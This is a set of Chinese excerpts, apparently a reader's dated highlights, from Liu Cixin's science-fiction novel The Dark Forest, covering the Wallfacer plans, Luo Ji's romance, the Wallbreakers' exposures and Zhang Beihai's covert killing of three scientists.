<p>正如萨伊曾说过的，这种使命在被交付前，是不可能向要承担它的人征求意见的；而面壁者的使命和身份一旦被赋予，也不可能拒绝或放弃。这种不可能并非来自于谁的强制，而是一个由面壁计划的本质所决定的冷酷逻辑，因为当一个人成为面壁者后，一层无形的不可穿透的屏障就立刻在他与普通人之间建立起来，他的一切行为就具有了面壁计划的意义，正像那对面壁者的微笑所表达的含义：</p>
<p>我们怎么知道您是不是已经在工作了？</p>
<p>2016-01-13</p>
<p>罗辑现在终于明白，面壁者是历史上从未有过的最诡异的使命，它的逻辑冷酷而变态，但却像锁住普罗米修斯的铁环般坚固无比，这是一个不可撤销的魔咒，面壁者根本不可能凭自身的力量打破它。不管他如何挣扎，一切的一切都在对面壁者的微笑中被赋予了面壁计划的意义：</p>
<p>我们怎么知道您是不是在工作？</p>
<p>2016-01-13</p>
<p>一股从未有过的冲天怒火涌上罗辑的心头，他想声嘶力竭地大叫，想问候萨伊和联合国的母亲，再问候特别联大所有代表和行星防御理事会的母亲，问候全人类的母亲，最后问候三体人那并不存在的母亲。他想跳起来砸东西，先扔了萨伊办公桌上的文件、地球仪和竹节笔筒，再把那面蓝旗撕个粉碎……但罗辑终于还是明白了这是什么地方，他面对的是谁，最终控制了自己，站起来后又重重地把自己摔回沙发上。</p>
<p>2016-01-13</p>
<p>您对我没有信心，是吗？”罗辑问。</p>
<p>“我说过，选择您是一次重大的冒险。”</p>
<p>“那您是对的。”</p>
<p>“冒险是对的吗？”</p>
<p>“不，对我没信心是对的。”</p>
<p>2016-01-13</p>
<p>他竟在这种时候想起了中学物理老师出过的一道思考题：如何用大理石做一张床，使人躺上去感觉像席梦思一样柔软？答案是把大理石表面挖出一个与人的身体背部形状一模一样的坑，躺到坑里，压强均匀分布，感觉就十分柔软了。罗辑闭上双眼，想象着自己的体温融化了身下的铁矿石，形成了一个那样的坑……就用这种方式，他使自己渐渐冷静下来。过了一会儿，他再次睁开双眼，望着朴素的天花板。</p>
<p>2016-01-13</p>
<p>哦，还有，如果找到了合适地方，永远不要告诉我它在哪。”</p>
<p>不不，别说在哪儿！一知道在哪儿，世界就变得像一张地图那么小了；不知道在哪儿，感觉世界才广阔呢。</p>
<p>2016-01-13</p>
<p>伽尔宁又点点头，这次显得很高兴，“罗辑博士，您除了像我心目中的面壁者外，还有一个最令人满意的地方：这项行动是四个面壁者中投入最小的，至少目前是如此。”</p>
<p>“如果是这样，那我的投入永远不会多。”</p>
<p>“那您将是我所有继任者的恩人，钱的事真是让人头疼……往后具体的执行部门可能要向您咨询一些细节问题，我想主要是关于房子的。”</p>
<p>“对了，关于房子，我真的忘了一个细节，非常重要的。”</p>
<p>“您说吧。”</p>
<p>罗辑也学着伽尔宁眨着一只眼笑笑，“要有壁炉。”</p>
<p>2016-01-15</p>
<p>那是有关打捞一艘十七世纪中叶的沉船的，那艘三桅帆船由鹿特丹驶向印度的法里达巴德，在霍恩角沉没。在潜水员从沉船中捞出的物品里，有一小桶密封很好的葡萄酒，据专家推测，那酒现在还可以喝，而且经过三百多年的海底贮藏，口感可能是无与伦比的。罗辑把这个节目的大部分都录下来，然后叫来了坎特。</p>
<p>“我要这桶酒，去把它拍下来。”他对坎特说。</p>
<p>坎特立刻去联系，两小时后他来告诉罗辑，说那桶酒的预计价格高得惊人，起拍价就可能在三十万欧元左右。“这点钱对于面壁计划算不了什么，去买吧，这是计划的一部分。”</p>
<p>这样，继“对面壁者的笑”之后，面壁计划又创造了一句成语，凡是明知荒唐又不得不干的事，就被称做“面壁计划的一部分”，简称“计划的一部分。”</p>
<p>2016-01-17</p>
<p>这时，朝阳从地平线处露出明亮的顶部，荒漠像显影一般清晰起来，雷迪亚兹看到，这昔日地狱之火燃起的地方，已被稀疏的野草覆盖。</p>
<p>“我正变成死亡，世界的毁灭者。”艾伦脱口而出。</p>
<p>“什么？！”雷迪亚兹猛地回头看艾伦，那神情仿佛是有人在他背后开枪似的。</p>
<p>“这是奥本海默在看到第一颗核弹爆炸时说的一句话，好像是引用印度史诗《薄伽梵歌》中的。”</p>
<p>东方的光轮迅速扩大，将光芒像金色的大网般撒向世界。叶文洁在那天早晨用红岸天线对准的，是这同一个太阳；在更早的时候，在这里，也是这轮太阳照耀着第一颗原子弹爆炸后的余尘；百万年前的古猿和一亿年前的恐龙用它们那愚钝的眼睛见到的，也都是这同一个太阳；再早一些，原始海洋中第一个生命细胞所感受到的从海面透入的朦胧光线，也是这个太阳发出的。</p>
<p>艾伦接着说：“当时一个叫班布里奇的人紧接着奥本海默说了一句没有诗意的话：现在我们都成了婊子养的。”</p>
<p>2016-01-17</p>
<p>罗辑点头，“是的是的，她有知识，但那些知识还没有达到学问的程度去僵化她，只是令她对世界和生活更敏感</p>
<p>2016-01-17</p>
<p>没什么对不对的，如果每个人都要先弄清楚为什么再执行命令，那这世界早乱套了。坎特先生，你的级别是比我高些，但说到底，我们都是执行命令的人，我们首先应该明白，有些事情不是由我们这样的人来考虑的，我们尽责任就行了，做不到这点，你的日子怕很难过。”</p>
<p>2016-01-17</p>
<p>着她捧着酒杯那天真的样子，罗辑心中最柔软的部分被触动了。让她喝酒她就喝，她相信这个世界，对它没有一点戒心，是的，整个世界到处都潜伏着对她的伤害，只有这里没有，她需要这里的呵护，这是她的城堡。</p>
<p>2016-01-17</p>
<p>那……”庄颜的头歪一歪，罗辑的心也随着动一动，这种稚气的表情和眼神他以前在那个她的身上见过无数次了，“罗老师，我总得知道我的工作啊？”</p>
<p>2016-01-17</p>
<p>这是一条穿越森林的很窄的简易公路，但车子行驶在上面很稳，林中未散的晨雾把穿透高大松林的阳光一缕缕地映出，即使在引擎声中，也能清晰地听到林间的鸟鸣。清甜的风把庄颜的长发吹起，一缕缕撩到他的脸上，痒痒之中，他又想起了两年前的那次冬日之旅。现在周围的一切与那时的冬雪后的华北平原和太行山已恍若隔世，那时的梦想却与现在的现实无缝连接，罗辑始终难以置信这种事发生在自己身上。罗辑转头看了庄颜一眼，发现她也在看着自己，而且似乎已经看了好长时间，那眼神中略带好奇，但更多的是清纯的善意。林间的光束从她脸上和身旁一道一道地掠过，看到罗辑在看自己，她的目光并没有回避。</p>
<p>2016-01-17</p>
<p>这话和庄颜那天真无邪的样子让罗辑的眼眶又湿润了。成为面壁者后，他第一次得到这样的问候，女孩儿的眼睛是他的天堂，那清澈的目光中，丝毫没有其他人看面壁者时的那种眼神；她的微笑也是他的天堂，那不是对面壁者的笑，那纯真的微笑像浸透阳光的露珠，轻轻地滴到他心灵中最干涸的部分。</p>
<p>2016-01-17</p>
<p>罗辑看着雪中的庄颜，在这纯洁雪白几乎失去立体感的空间中，世界为她隐去了，她是唯一的存在。两年前，当他创造的那个文学形象在想象中活起来的时候，罗辑体会到了爱情；而现在，就在这大自然画卷的空白处，他明白了爱的终极奥秘。“庄颜，你的工作就是：使自己幸福快乐。”</p>
<p>2016-01-17</p>
<p>庄颜的双眸中映着那照亮世界的雪峰的光芒，在她纯净的目光中，种种复杂的感情如天上的浮云般掠过。雪山吸收了来自外界的一切声音，寂静中罗辑耐心地等待着，终于，庄颜用似乎来自很远的声音问道：</p>
<p>2016-01-17</p>
<p>庄颜笑了起来，好像罗辑变成了一个无知的孩子，“罗老师，我画画是给自己看的，没想过你说的那些。”</p>
<p>2016-01-17</p>
<p>老人缓缓摇摇头，“你想必也能看出来，我活不了多久了。”他那双深邃的眼睛突然透出一丝顽皮的光芒，“我知道你是这个世界上最不希望看到我病死的人之一，真的很对不起。”后面这句话中的讥讽意味刺痛了泰勒，但说的也确实是事实。泰勒以前最恐惧的事情就是这人病死或老死。国防部长曾经不止一次地祈祷，在这人自然死亡之前，让美国的巡航导弹或特种部队的子弹落到他头上，哪怕是提前一分钟也好啊！自然死亡将是这个老人最终的胜利，也是反恐战争惨重的失败，现在这个人正在接近这个辉煌。其实以前机会也是有的，有一次，一架“食肉动物”无人机在阿富汗北部山区一所偏僻的清真寺院落里拍到了他的图像，操纵飞机直接撞上去就能创造历史，更何况当时无</p>
<p>2016-01-17</p>
<p>人机上还带着一枚“地狱火”导弹，可是那名年轻的值班军官在确认了目标的身份后，不敢擅自决定，只好向上请示，再回头看时目标已经消失了。当时被从床上叫起来的泰勒怒火万丈，咆哮着把家里珍贵的中国瓷器摔得粉碎……</p>
<p>2016-01-17</p>
<p>“有这么一种传说，据说您是以这套小说为自己的组织命名的？”老人把书轻轻地放下，微微一笑，“传说就让它永远是传说吧，你们有财富和技术，我们只有传说了。”</p>
<p>2016-01-17</p>
<p>“是的，你肯定也看到了最近发生的事。四个世纪后，灾难后的人类世界可能会退回到中世纪的状态，人性将再次处于极度</p>
<p>2016-01-17</p>
<p>的压抑之下。”“那艺术也就进入冬天和黑夜了，是吗？”看着庄颜那天真的目光，罗辑暗自苦笑了一下——傻孩子，还谈什么艺术，如果真能生存下来，人类即使退回到原始社会也是一个很小的代价。但他还是说：“到那时，也许会有第二次文艺复兴，你可以重新发现已经被遗忘的美，把她画出来。”庄颜笑了笑，那笑容有些凄惨，她显然领会到了罗辑善意的安慰，“我只是在想，末日之后，这些画儿，这些艺术品会怎么样？”“你担心这个？”罗辑问，女孩儿轻轻地说出“末日”二字，他的心痛了一下，但如果说刚才的安慰是失败的，这一次他相信自己能成功，于是拉起庄颜的手说，“走，我们去东方艺术馆。”</p>
<p>2016-01-17</p>
<p>罗辑看着庄颜思考了几秒钟，然后盯着蒙娜丽莎看，“我明白你的意思了，她的微笑是智子和三体人永远理解不了的。”</p>
<p>2016-01-17</p>
<p>“行了哈里斯，这里不只有你一个怀疑主义者，大家心里都不好受。”有人说。叫哈里斯的年轻人抬起泪眼说：“我知道怀疑只是一种安慰而已，但我想在这安慰中过完这一生……上帝，我们连这点幸运都没有了。”</p>
<p>2016-01-17</p>
<p>林格终于注意到斐兹罗，“将军，我大概解释一下吧：那三颗恒星周围有一片星际尘埃，这之前，有一批高速运动的物体穿过了这片尘埃，它们的高速冲击在尘埃中留下了尾迹，这尾迹不断扩散，现在其断面直径已经扩散到两个木星大小，尾迹与周围的尘埃只有细微的差别，所以在近处是看不到的，只有在我们这四光年远的位置，它才能被观察到。”</p>
<p>2016-01-17</p>
<p>哈勃二号太空望远镜的发现最后证实了三体入侵的真实性，也熄灭了人类最后的幻想。在新一轮的绝望、恐慌和迷茫之后，人类真正进入了面对三体危机的生活。艰难时世开始了，历史的车轮经历了转向的颠簸之后，开始沿着新的轨道前进。在巨变的世界中，不变的只有时间流逝的速度，恍惚间，五年过去了。</p>
<p>危机纪年第8年，三体舰队距太阳系4.20光年</p>
<p>2016-01-17</p>
<p>泰勒最近一直处于焦躁之中，他常常下到深达两百米的地下存贮库中，看着那些已收集到的宏原子核在禁锢磁场之中跳着永恒之舞。这些线形物的舞蹈有一种强烈的催眠作用，他常常几个小时地盯着它们，只有这时才感到心灵的宁静。</p>
<p>2016-01-17</p>
<p>这一天，泰勒有一个访客。与其他面壁者一样，他的家是戒备森严的，来访者必须经过严格的安全检查。但在客厅中见到来人时，泰勒就明白他肯定能很顺利地进来，因为这人一看就是一个对任何人都不会有威胁的人。他在大热天穿着一身皱巴巴的西装，还系着一条同样皱巴巴的领带，更让人不可忍受的是还戴着一顶现在已很少见的礼帽，显然是想让自己的来访显得正式些，而在此之前他大概没去过什么正式的场合。他面黄肌瘦，像营养不良似的，眼镜在瘦小苍白的脸上显得大而沉重，他那细小的脖子看上去支撑起脑袋和礼帽的重量都困难，那套起皱的西装更像是空荡荡地挂在一个衣架上。作为政治家的泰勒，一眼就看出这人属于社会上最可怜的那类人，他们的可怜之处不仅仅在于物质上，更多是精神上的卑微，就像果戈理笔下的那些小职员，虽然社会地位已经很低下，却仍然为保住这种地位而忧心忡忡，一辈</p>
<p>2016-01-17</p>
<p>子在毫无创造性的繁杂琐事中心力交瘁，成天小心谨慎，做每件事都怕出错，对每个人都怕惹得不高兴，更是不敢透过玻璃天花板向更高的社会阶层望上一眼。这是泰勒最看不起的一类小人物，他们是真正的可有可无之人，想想自己要拯救的世界中大部分都是这类人，他总是感到兴味索然。</p>
<p>2016-01-17</p>
<p>见到按真实比例绘制的空间图，才感受到了太阳系的广阔。不管是空军还是海军，他们能够航行或飞行的最远距离在这张屏幕上连一个像素的大小都不到。”</p>
<p>2016-01-17</p>
<p>泰勒到达时，太阳已经快落山了，他一出车门，就看到了一幅天堂般的景象：一天中最柔美的阳光洒在雪山、湖泊和森林上，在湖边的草坪上，罗辑一家正在享受着这尘世之外的黄昏。泰勒首先注意到的是那位美丽的母亲，她仍是少女的样子，倒像是那个一周岁的孩子的姐姐。距离远时看不清，随着他走近，注意力便转移到孩子身上。如果不是亲眼见到，他真不相信世界上有这么可爱的小生命。这孩子像一个美丽的干细胞，是所有美的萌芽状态。母亲和孩子在一张大白纸上画画，罗辑则远远地站在一边入神地看着，就像在卢浮宫中，远远地看着他所爱的现在已成为母亲的少女一样。再走近些，泰勒从他的眼神中看到了无边的幸福，那幸福就像这夕阳的光芒般弥漫于伊甸园的雪山和湖泊之间……</p>
<p>2016-01-17</p>
<p>“如果是这样，先生，我可以不再继续说下去，您接着可以逮捕我，但有一点您肯定已经想到：不管怎么样，您的真实战略以及推测出这个战略的所有证据，都将在明天甚至今晚全世界新闻中出现。我是以自己的后半生为代价来与您见面的，希望您能珍惜我的牺牲。”</p>
<p>2016-01-17</p>
<p>“您的球状闪电舰队不需要那样的战士，因为这支舰队最终要攻击的根本就不是三体舰队，它的攻击目标是地球主力舰队。”</p>
<p>2016-01-17</p>
<p>“在接近末日之战的某一时刻，当地球舰队严阵以待，准备出击时，将发生一次超级太空珍珠港事件，这次毁灭性的袭击将来自他们做梦都想不到的方向，来自他们做梦都想不到的人。宏原子聚变的光芒将在太空军港中亮起，其聚变能量之高，看上去</p>
<p>2016-01-17</p>
<p>像无数个太阳，就在这些蓝色的太阳中，地球主力舰队灰飞烟灭，化作无数量子幻影消失在太空中。这时，您便得到了自己想要的东西：一支呈宏观量子态的地球舰队。用大众更容易明白的话说：你要消灭地球太空军，让他们的量子幽灵去抵抗三体舰队。您认为他们是不可战胜的，因为已被摧毁的舰队不可能再被摧毁，已经死去的人不可能再死一次。”</p>
<p>2016-01-17</p>
<p>“所以，您所寻求的自我牺牲精神，不是在与主的战争中发扬，而是保证那些太空军人在被自己的人类同胞杀死后，其量子鬼魂仍能忍辱负重，仍以拯救地球文明为己任，继续完成那些本应由活着的他们完成的使命。您最初并没有计划对主力舰队进行最后的突然袭击，您想让太空战士们自愿借助于宏原子，与他们的战舰一同化为量子态。但在周游世界后，您对现代人类的献身精神彻底失望了，于是产生了这个极端的战略计划。设想袭击之后，只要量子舰队的一部分能够作战，且其余部分不与人类为敌，胜利也是有希望的。不过我认为，这希望不大，您是在冒一个大险。但是，按照面壁计划的原则，在这场战争中，冒险才是最安全的。”</p>
<p>2016-01-17</p>
<p>“坦率地说，泰勒先生，作为面壁者您是不合格的。在战略欺骗领域，诺曼底登陆是你们最后的辉煌，以后，美国强大的力</p>
<p>2016-01-17</p>
<p>量使它的领导者们失去了很多东西，包括战争谋略所需的诡秘和奸诈，因为你们不再需要这些。当面对力量比你们强大的敌人时，这种能力也无法恢复，您的战略缺少曲折和误导，也缺少欺骗的陷阱，过分直白，所以，您成为了第一个被破壁的面壁者。”</p>
<p>2016-01-17</p>
<p>“但，泰勒先生，您并非一无是处，您有一点让我很吃惊：毅然决然地抛弃了现代社会的道德基石，而且在整个行动过程中坚定不移。这不容易，我表示钦佩，但同时也要提醒您：您这是在谋杀。”</p>
<p>2016-01-17</p>
<p>破壁人回过头来，再次表现出那种刽子手的温柔体贴，“不会怎么样的，泰勒先生，不管地球舰队是坍缩态还是量子态，不管人类太空战士是活人还是量子幽灵，主都不在乎。”</p>
<p>2016-01-17</p>
<p>罗辑进入了一个不祥的梦境，他在梦中穿行于卢浮宫无穷无尽的厅堂中，他从未梦到过这里，因为这五年中一直身处幸福之中，不需要再回梦以前的幸福。而在这个梦境中，他是孤身一人，感到了已经消失了五年的孤独，他的每一次脚步声都在宫中回荡多次，每一次回荡都像是什么东西远去了，以至于他最后不敢再迈步。前面就是蒙娜丽莎，她不再微笑，那双看着他的眼睛带着怜悯。脚步声一停下，外面喷泉的声音就渗了进来，这声音渐渐增强，罗辑醒了过来，那水声跟着他来到了现实中，外面下起了雨。他翻身想抓住爱人的手，但再次发现梦境变成了现实。庄颜不在了。罗辑翻身下床，走进育儿室，那里亮着柔和的灯光，但孩子也不在了，在那张已经收拾整齐的小床上，放着一张画。那是庄颜画的他们两人都最喜欢的一张画，画幅上几乎全是空白，远看就是一张白纸，近看会发现左下角有几枝细小的芦苇，右上角有一只几乎要消失的飞雁，空白的中央，有两个小得不能再小的人儿，但现在，空白中还有一行娟秀的字：亲爱的，我们在末日等你。</p>
<p>2016-01-17</p>
<p>“这当然无可厚非，但你有很多与一名严肃和敬业的学者不相称的行为：你做研究的功利性很强，常常以投机取巧为手段，哗众取宠为目的，还有过贪污研究经费的行为；从人品方面看，你玩世不恭，没有责任心，对学者的使命感更是抱着一种嘲笑的态度……其实我们都清楚，对人类的命运你并不关心。”</p>
<p>2016-01-17</p>
<p>光锥之内就是命运。</p>
<p>2016-01-17</p>
<p>不知不觉中，一个月过去了，冬天彻底来临，但罗辑仍在外面进行着他那漫长的思想行程，寒冷使他的思想锐利起来</p>
<p>2016-01-17</p>
<p>不要轻视简单，简单意味着坚固，整个数学大厦，都是建立在这种简单到不能再简单，但在逻辑上坚如磐石的公理的基础上。</p>
<p>2016-01-17</p>
<p>他走上了冰封的湖面，开始小心翼翼，后来发现冰面似乎很结实，就边滑边走，更快地向前去，一直走到四周的湖岸在夜色中看不清为止。这时，他的四周都是平滑的冰面，把尘世的复杂和混沌隔远了些。他想象着这冰的平面向所有方向无限延伸，便得到了一个简单的平面世界，一个寒冷而平整的思想平台。困扰消失了，他很快又进入了那种状态，感觉一切都静止下来，星空又在等待着他……</p>
<p>2016-01-17</p>
<p>辑站在冰面上，牙齿在寒冷中咯咯地碰撞着，这寒冷似乎不是来自湖水和寒风，而是从外太空直接透射而来。罗辑没有抬头，他知道，从这一刻起，星空在自己的眼里已经是另一个样子，他不敢再抬头看了。和雷迪亚兹害怕太阳一样，罗辑从此患上了严重的星空恐惧症。他低着头，牙齿在寒战中格格作响，对自己说：</p>
<p>“面壁者罗辑，我是你的破壁人。”</p>
<p>2016-01-17</p>
<p>坎特要走时，罗辑叫住了他，指着窗外已经完全被冰雪覆盖的伊甸园说：“能告诉我这儿的地名吗？我会想念这里的。”</p>
<p>2016-01-17</p>
<p>“就是一种经过基因改造的病毒，传染性很强，但对一般人而言，它只是产生轻流感这样的轻微症状，但这种病毒具有基因识别能力，能够识别某个人的基因特征，一旦这个攻击目标被感染，病毒就会在他的血液中制造致命的毒素，现在我们知道目标是谁</p>
<p>2016-01-17</p>
<p>这位大校研究员说：“张主任，也不能这样说，这真是防不胜防，我们开始虽然怀疑，也没有向这方面考虑。基因武器的概念上世纪就出现了，但谁会信竟真有人把它造出来了，虽还很不完善，不过作为暗杀武器真的很可怕：只需要在目标所在的大致范围撒播这种病毒就行了，甚至连目标的大致范围也不需要知道，可以在全球撒布，因为这种病毒对一般人致病性很弱甚至没有，可以快速大范围传播，最后也有很大的可能击中目标。”</p>
<p>危机纪年第12年，三体舰队距太阳系4.18光年</p>
<p>2016-01-17</p>
<p>既然有了智子，发射探测器有什么必要呢？”一名工程师问。</p>
<p>2016-01-17</p>
<p>海军的最前沿应该是敌人的港口</p>
<p>2016-01-17</p>
<p>这人五十开外的样子，面色和精神都很好，章北海一眼就看出他属于那样一类幸运的人，有自己钟爱的小世界，不管大世界怎样变化都能沉浸其中自得其乐。在老宅所特有的那种陈旧气息中，章北海意识到在自己和同志们为人类的生存而战时，大部分人仍然执著于自己固有的生活，这让他心里感到温暖和踏实。</p>
<p>2016-01-17</p>
<p>太空电梯的建成和可控核聚变技术的突破，对世界是两个巨大的鼓舞，也在很大程度上缓解了失败主义情绪。但冷静的领导者们知道，这一切仅仅是开始，如果把太空舰队的建设与海洋舰队相类比的话，人类现在也只是拿着工具刚刚来到海岸边，连造船的船坞都还没有搭建起来。除了太空飞船本体的建设，星战武器和飞船循环生态系统的研究，以及太空港口的建设，都将面临着人类从未面对过的技术深渊，这一切，仅在技术上完成准备，可能就需要一个世纪的时间。除令人望而生畏的技术深渊外，人类社会还将面临另一个严峻的考验：太空防御系统的建设将消耗超量的资源，这种消耗很可能使人类的生活水平倒退一个世纪。所以，对人类精神的最大挑战还在未来</p>
<p>2016-01-17</p>
<p>收藏者拿出了三块大小差不多的铁陨石，开始为要价做铺垫：“铁陨石数量不多，只占陨石总数的百分之五，而且这三块成色都很好。您看，这一块是八面石，这块是富镍角砾斑杂岩，看这上面的交错条纹，这叫韦氏条纹；这种平行的叫牛曼条纹；这块含有锥纹石，这块有镍纹石，这可都是地球上没有的矿物。这一块是我在沙漠中采集到的，用金属探测器找，简直是大海捞针。那一次车陷到沙里，把传动轴都顶断了，差点丢了命。”</p>
<p>“你出个价吧。”</p>
<p>“这样大小和档次的陨石，国际市场上的价格大概是每克二十美元，这样吧，每块六万，三块十八万，怎么样？”</p>
<p>章北海拿出手机说：“给个账号吧，我现在就付款。”</p>
<p>收藏者半天没吱声，章北海抬头看看，见他有些尴尬地笑着：“呵呵，其实，我是准备你还价的。”“不，我接受。”</p>
<p>“你看，现在毕竟太空航行平民化了，虽然目前上太空中搞陨石还不如地球上方便，但市场上的价格毕竟跌了些，这些嘛，也就值……”</p>
<p>章北海很坚决地打断了他，“不，就这个价，就算表示我对要送的人的尊重吧。”</p>
<p>2016-01-17</p>
<p>在地球大气层内，即使最精良的狙击步枪也不可能在五千米的距离上击中目标，但在太空中，一支普通手枪就可以做到。因为子弹是在真空和无重力中前进，不受任何干扰，只要瞄准正确，子弹就能沿着极其稳定的直线弹道击中目标；同时，由于空气阻力为零，子弹在整个飞行过程中根本不减速，击中目标时的速度就是飞出枪口时的初速度，保证了远距离上的杀伤力。</p>
<p>2016-01-17</p>
<p>无辜？他要杀的这三个人也是无辜的，在三体危机出现前的岁月里，他们用现在看来十分微薄的投入，小心翼翼如履薄冰地开启了太空时代的黎明……然而正是那段经历禁锢了他们的思想，为了得到能够在恒星际航行的飞船，必须消灭他们！而他们的死，也应该看作为人类太空事业做出的最后贡献。</p>
<p>2016-01-17</p>
<p>事实上，章北海故意使几颗子弹稍稍走偏，期望能击中目标之外的人，最理想的情况是致伤，但如果真的多死一两个人，他也不在意，这样做的目的是为了减少可能出现的怀疑。</p>
<p>章北海举着已经打空的枪，透过瞄准镜冷静地观察着，他做好了失败的准备，如果那样，他将从容不迫地开始寻找第二次机</p>
<p>2016-01-17</p>
<p>章北海开动喷射推进器，向一号基地方向加速，此时他的心就像周围空寂的太空一般寒冷而平静</p>
<p>2016-01-17</p>
<p>常伟思的目光一直没有离开章北海的背影，这个坚定的战士走了，可能不会再有第二个他这样的人。他那种坚定的信念是从哪里来的？这个问题一直藏在常伟思心底，有时想到这个甚至令他有些嫉妒。一个拥有胜利信念的军人是幸运的，在这场终极战争中，能有这种幸运的人少之又少。章北海挺拔的身影消失在舱门中，常伟思不得不承认，到最后，自己也没能彻底了解他。</p>
<p>危机纪年第20年，三体舰队距太阳系4.15光年</p>
<p>2016-01-18</p>
<p>希恩斯说：“怎么一提到思想控制，大家都这样敏感？其实就是在现代社会，思想控制不是一直在发生吗？从商业广告到好莱坞文化，都在控制着思想。你们，用一句中国话来说，不过是五十步笑百步而已。”</p>
<p>2016-01-18</p>
<p>即将进入冬眠的山杉惠子沉浸在越来越深的寒冷中，和十多年前罗辑掉入冰湖那一刻一样，严寒和冻结滤去了她意识中的纷繁和嘈杂，把她集中思考的那条线索在冷寂的黑暗中凸现出来，以前模糊不清的思绪突然异常清晰起来，像严冬冷冽的天空。</p>
<p>2016-01-18</p>
<p>后来的进一步观测却有了一个震撼的发现：行星与母星已经很近的距离仍在不断缩短中，而且这种缩短还在很快加速，这就意味着，人类将第一次观察到一颗行星坠入恒星的景象</p>
<p>2016-01-18</p>
<p>假设最后真的得到了那一百万颗甚至更多的恒星型氢弹，您就会像对PDC承诺的那样，把它们全部部署在水星上，如果在水星的地层中引爆这些氢弹，就会像一台超级发动机那样对这颗行星产生减速作用，最终会使水星失去维持其低轨道的速度，坠入太阳。接下来，在八十四光年外的275E1发生的事就会在太阳上重演：太阳的对流层外壳将会被水星击穿，深处辐射层中巨量的恒星物质将高速射入太空，在太阳的自转中，将形成一个类似于215E1的螺旋形大气层。太阳与三体恒星不同，是一颗孤星，不存在与其他恒星近距离交错的可能，所以它的大气层将不受干扰地增长，最终其厚度将远大于三体恒星的大气层，这也在对275E1的观察中证实了。太阳喷出的这条螺旋形物质流将像松开的发条那样迅速向外扩张，它的厚度最终将超过火星轨道，这时，一个宏大的连锁反应开始了。</p>
<p>2016-01-18</p>
<p>首先，金星、地球和火星这三颗类地行星都将在太阳的螺旋大气层中运行，在摩擦中很快失去速度，最终将变成三颗巨型流星坠入太阳。其实早在这之前，地球大气层就在与太阳物质的剧烈摩擦中被剥离，海洋蒸发殆尽，剥离的大气和蒸发的海洋将把地球变成一颗巨型彗星，它的彗尾可能长得沿着轨道绕太阳一周，地球表面将回到其形成之初的岩浆火海状态，没有任何生命能够幸存。</p>
<p>“金星、地球和火星三星的坠落，将大大加剧太阳物质向太空中的喷发，喷射的螺旋形物质流由一条增加到四条，这三颗行星的质量总和是水星的四十倍，且由于轨道高，坠落时的冲击速度远大于水星，每条物质流喷发的猛烈程度是水星坠落的几十倍甚至更多，将使已形成的螺旋大气层急剧膨胀，它的顶端最终将到达木星轨道。</p>
<p>“木星质量巨大，摩擦产生的减速很小，轨道受到的影响要很长时间后才能看到，但木星的所有卫星将面临着以下两种命运：在摩擦中被剥离木星，然后各自失去速度坠入太阳；或者在木星轨道上失去速度坠入液态的木星。</p>
<p>“连锁反应仍在继续，虽然螺旋大气层对木星的减速很小，但减速毕竟存在，木星轨道将向太阳缓慢下沉。随着这种下沉的发生，木星将在越来越密集的螺旋大气层中运行，摩擦产生的减速将迅速增加，进而导致轨道更快地下沉……这样，木星最终也将坠入太阳。木星的质量是前面四颗类地行星质量总和的六百倍，如此巨型的质量体冲击太阳，即使按最常规的推论，也将产生更猛烈的恒星物质喷射，使螺旋大气更为稠密，加剧了天王星和海王星世界的严寒。但还有一种更大的可能性：巨大木星的坠入，使螺旋大气层的顶端延伸至天王星甚至海王星轨道，即使大气层的顶端很稀薄，摩擦产生的减速最终也会把剩下的这两颗大行星和它们的所有卫星一起拉向太阳。当这最后的连锁反应完成后，先后受到四颗致密的类地行星和三颗巨大的类木行星的冲击，太阳将变成什么状态，太阳系将变成什么样子，谁都无法预料，但有一点可以肯定：对生命和文明来说，这里将是一个比三体世界更严酷的地狱。</p>
<p>“对三体世界而言，在他们的行星被三颗恒星吞噬之前，太阳系是唯一的希望，再没有第二个可以及时移民的世界，这样，继人类之后，三体文明也必将彻底灭亡。</p>
<p>“这就是您的同归于尽战略。当一切都准备完毕，所有氢弹都已在水星上就位时，您将以此来要挟三体世界，最终使人类赢得胜利。</p>
<p>2016-01-18</p>
<p>破壁人在沙发上紧靠着雷迪亚兹坐下，像一位教师评价学生的作业一样娓娓说道：“雷迪亚兹先生，我说过，您是一位出色的战略家，至少在这个战略计划的制订和执行过程中表现出了许多卓越之处。</p>
<p>“首先，您成功地利用了自己的背景。现在，人们都对您和您的国家在核能开发方面遭遇的屈辱记忆犹新，当时在奥里诺科的核设施被迫拆除的现场，全世界都看到了您阴郁的表情。您正是利用了外界所看到的自己对核武器的这种偏执，减轻甚至消除了可能引起的怀疑。</p>
<p>“计划执行过程中的每个细节都表现了您的才能，这里仅举一例：在水星试验中，您本来就想把地层炸飞，却坚持要挖掘超深井，这是很有远见的高帽子战术，您了解PDC各常任理事国对这个耗资巨大的工程的忍耐力，把握之精确，令人敬佩。</p>
<p>“但您还是有一个重大纰漏：为什么首次核试验非要在水星上进行呢？以后有的是时间，也许您太急躁了，急于看到恒星型氢弹在水星上爆炸的效果。您看到了，有大量地层物质被炸飞到逃逸速度，很可能超出了您的预期，您很满意，但也使我的推测得到了最后的证实。</p>
<p>“真的，雷迪亚兹先生，尽管有前面的工作，但如果不是通过最后这件事，我也许永远不能确定您的真实战略意图，因为这想法太疯狂了，不过真的很壮观，甚至，很美。如果水星的坠落引发的连锁反应真的实现，那将是太阳系最壮丽的乐章，可惜人类只能欣赏最初的一个半小节。雷迪亚兹先生，您是一个具有上帝气质的面壁者，能成为您的破壁人，是我的荣幸。”</p>
<p>2016-01-18</p>
<p>您外表粗鲁内心精明，但再往灵魂的最深处，又是粗鲁的。您在最本质上是一个粗人，这种粗鲁在这个战略计划的基础上表露无遗：这是一个蛇吞象的计划，人类没有能力制造出那样数量的恒星型氢弹，即使倾尽全部地球的工业资源，还是可能十分之一都生产不出来。把水星减速到坠入太阳，即使真有一百万颗恒星型氢弹，也远远不够。您以一介武夫的鲁莽制定了这个根本不可能实现的计划，却以一个卓越战略家的老谋深算，坚韧不拔地一步步推进它，面壁者雷迪亚兹，这真的是个悲剧。”</p>
<p>2016-01-18</p>
<p>“这确实是个难题。”雷迪亚兹对德国代表点点头说，“如果没有智子，这个问题很容易解决：所有节点都装入一个相同的加密算法，每次发送的信号都由这种算法产生，在外界看来每次的信号值都是随机的，每次都不同，但‘摇篮’的发送和接收方却产生完全相同的序列值，接收方只有在收到与自己序列相对应的信号值时才认为信号有效。您的伪信号源没这种加密算法，它发出的信号与接收方的序列肯定对应不上。但现在有智子这鬼东西，它能探测出这种算法。”</p>
<p>2016-01-18</p>
